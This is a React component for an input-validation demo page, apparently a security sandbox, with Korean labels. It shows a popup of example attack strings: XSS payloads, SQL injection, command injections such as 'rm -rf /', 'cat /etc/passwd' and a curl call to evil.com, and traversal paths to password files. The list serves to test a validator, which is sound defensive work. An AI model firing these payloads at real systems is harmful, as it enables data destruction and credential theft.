'use client'

import { useState } from 'react'

type Props = {
  open: boolean
  onToggle: () => void
}

/* 금지 문자열 그룹 (1번 섹션 예제 팝업용) */
const dangerGroups = [
  {
    category: 'XSS 공격',
    items: [
      '<script>',
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>',
      '<iframe>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<link rel=import href="javascript:alert(1)">',
    ],
  },
  {
    category: 'SQL 인젝션',
    items: [
      `' OR 1=1 --`,
      'UNION SELECT *',
      'drop table users',
      `" OR "" = "`,
      "admin'--",
      `' OR 'a'='a'`,
      `'; shutdown --`,
      `' OR 1=1 LIMIT 1`,
    ],
  },
  {
    category: '특수문자 / 위험 패턴',
    items: [
      '< > \' "',
      '&{}[]',
      '@#$%^&*~',
      '\\..\\',
      '${7*7}',
      '${{7*7}}',
      '%0A',
      '%3Cscript%3E',
    ],
  },
  {
    category: 'Command Injection',
    items: [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& whoami',
      '$(ls)',
      '`ls`',
      '; curl http://evil.com',
    ],
  },
  {
    category: 'Directory Traversal',
    items: [
      '../../../../etc/passwd',
      '..%2f..%2fetc/passwd',
      '/etc/shadow',
      'C:\\Windows\\System32',
      '../config/database.yml',
    ],
  },
]

export default function InputValidatorSection({ open, onToggle }: Props) {
  const [input, setInput] = useState('')
  const [result, setResult] = useState<any>(null)
  const [showExamples, setShowExamples] = useState(false)

  const handleValidate = async () => {
    const res = await fetch('/api/sandbox/validate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: input }),
    })
    const data = await res.json()
    setResult(data)
  }

  return (
    <section
      onClick={onToggle}
      className="border rounded-xl shadow-sm bg-white dark:bg-neutral-900 p-6 cursor-pointer select-none transition-colors hover:bg-neutral-50 dark:hover:bg-neutral-800"
    >
      {/* 카드 제목 영역 (접히는 헤더) */}
      <div className="flex justify-between items-center">
        <div>
          <h2 className="text-xl font-semibold">입력 검증 API</h2>
          <p className="text-sm text-neutral-500 mt-1">
            사용자 입력값을 길이·허용문자·보안 위험 요소 기준으로 검증합니다.
          </p>
        </div>
        <span className="text-lg px-2 py-1">{open ? '▲' : '▼'}</span>
      </div>

      {open && (
        <div className="mt-4 border-t pt-4 relative text-neutral-700 dark:text-neutral-300">
          {/* 상단 라벨 + 예제 보기 버튼 */}
          <div className="flex justify-between items-center mb-3">
            <h4 className="font-semibold text-sm">입력 검증 실습</h4>

            <button
              type="button"
              onClick={(e) => {
                e.stopPropagation()
                setShowExamples((prev) => !prev)
              }}
              className="px-3 py-1 text-xs rounded border bg-white dark:bg-neutral-900 hover:bg-neutral-50 dark:hover:bg-neutral-800"
            >
              예제 보기
            </button>
          </div>

          {/* 예제 팝업 패널 (분리 전과 동일한 위치/스타일) */}
          {showExamples && (
            <div
              className="absolute right-0 top-9 z-10 w-96 max-h-56 overflow-y-auto border rounded bg-white dark:bg-neutral-900 shadow-lg p-3 text-sm"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="mb-2 text-[11px] text-neutral-500 dark:text-neutral-400">
                자주 사용되는 공격 패턴 예시입니다. 입력창과 동시에 사용
                가능합니다.
              </div>

              {dangerGroups.map((group, i) => (
                <div key={i} className="mb-3">
                  <div className="font-medium mb-1">{group.category}</div>
                  <div className="flex flex-wrap gap-x-4 gap-y-1 text-[14px] text-neutral-600 dark:text-neutral-400">
                    {group.items.map((item, idx) => (
                      <span key={idx}>• {item}</span>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          )}

          {/* 입력 필드 */}
          <input
            type="text"
            placeholder="검증할 문장을 입력하세요..."
            className="w-full p-2 border rounded mb-3 bg-white dark:bg-neutral-800"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            onClick={(e) => e.stopPropagation()}
          />

          {/* 버튼 */}
          <button
            onClick={(e) => {
              e.stopPropagation()
              handleValidate()
            }}
            className="px-4 py-2 mt-1 rounded bg-blue-600 hover:bg-blue-700 text-white"
          >
            검증하기
          </button>

          {/* 결과 + 위험 설명 (분리 전 구조 그대로) */}
          {result && (
            <div className="mt-6 space-y-4">
              <pre className="p-4 bg-neutral-100 dark:bg-neutral-800 rounded whitespace-pre-wrap text-sm">
                {JSON.stringify(result, null, 2)}
              </pre>

              {result.details && result.details.length > 0 && (
                <div className="p-4 bg-neutral-100 dark:bg-neutral-800 rounded border text-sm">
                  <h4 className="font-semibold mb-3">위험 설명</h4>
                  {result.details.map((d: any, idx: number) => (
                    <div key={idx} className="mb-3">
                      <div className="font-medium mb-1">패턴: {d.pattern}</div>
                      <div className="text-neutral-700 dark:text-neutral-300">
                        {d.description}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
      )}
    </section>
  )
}
